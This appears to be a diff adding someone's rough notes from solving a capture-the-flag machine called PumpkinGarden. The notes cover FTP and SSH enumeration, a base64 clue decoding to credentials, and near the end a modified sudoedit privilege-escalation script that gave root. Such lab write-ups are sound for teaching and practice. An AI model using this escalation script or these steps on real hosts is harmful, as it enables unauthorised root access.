@@ -1,0 +1,62 @@
+host is at 192.168.1.4
+ftp:	vsFTPd 3.0.2	port 21		anon
+had to install ftp
+jack jack/password creds don't work on ftp
+no exploitdb modules work on current ftp version
+no cve for current ftp version (exluding file bypass and DoS)
+armitage hail marry failed
+note.txt{
+Hello Dear!
+Looking for route map to PumpkinGarden? I think jack can help you find it.
+}
+suspected need for john the ripper (pass crack) [jack the ripper->john]
+no metadata found within file (binwalk, exif)
+
+port 3535 has ssh
+port 1515 has webserver
+in /img/hidden_secret there is clue.txt
+{
+c2NhcmVjcm93IDogNVFuQCR5
+}
+hash for john!
+
+not hash, just base64
+
+scarecrow : 5Qn@$y
+
+ssh creds?	no
+ftp creds?	yes!
+
+in home dir for scarecrow
+{
+Oops!!! I just forgot; keys to the garden are with LordPumpkin(ROOT user)! 
+Reach out to goblin and share this "Y0n$M4sy3D1t" to secretly get keys from LordPumpkin.
+}
+ssh creds?	no
+ftp creds?	yes!
+found note in home dir for goblin
+{
+Hello Friend! I heard that you are looking for PumpkinGarden key. 
+But Key to the garden will be with LordPumpkin(ROOT user), don't worry, I know where LordPumpkin had placed the Key.
+You can reach there through my backyard.
+
+Here is the key to my backyard
+https://www.securityfocus.com/data/vulnerabilities/exploits/38362.sh
+}
+the link gives a local priv esc script
+goblin [pass] did actually work on ssh
+got user shell!
+issues running the privEsc	Fixed: change script
+{
+cat > sudoedit << _EOF
+#!/bin/sh
+echo ALEX-ALEX
+su
+/bin/su
+/usr/bin/su
+_EOF
+chmod a+x ./sudoedit
+sudo ./sudoedit note
+}
+no need to cd to /tmp or take param for file
+after running, got root!
